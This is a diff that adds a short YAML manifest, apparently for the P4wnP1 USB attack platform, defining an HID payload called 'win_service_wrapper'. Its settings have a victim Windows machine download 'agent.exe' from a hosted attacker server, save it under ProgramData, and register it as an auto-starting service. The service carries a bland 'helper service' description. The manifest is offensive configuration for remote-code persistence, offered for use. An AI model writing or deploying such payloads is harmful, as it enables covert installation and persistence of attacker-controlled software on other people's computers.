@@ -1,0 +1,11 @@
+name: win_service_wrapper
+group: hid
+summary: Create/start a Windows service pointing to your hosted binary
+script: payloads/hid/win_service_wrapper.py
+env:
+  P4WN_SVC_NAME: "P4wnP1Svc"
+  P4WN_SVC_BIN_URL: "http://10.13.37.1/payloads/www/private/agent.exe"
+  P4WN_SVC_BIN_PATH: "C:\\ProgramData\\P4wnP1\\agent.exe"
+  P4WN_SVC_START: "auto"
+  P4WN_SVC_DESC: "P4wnP1 helper service"
+
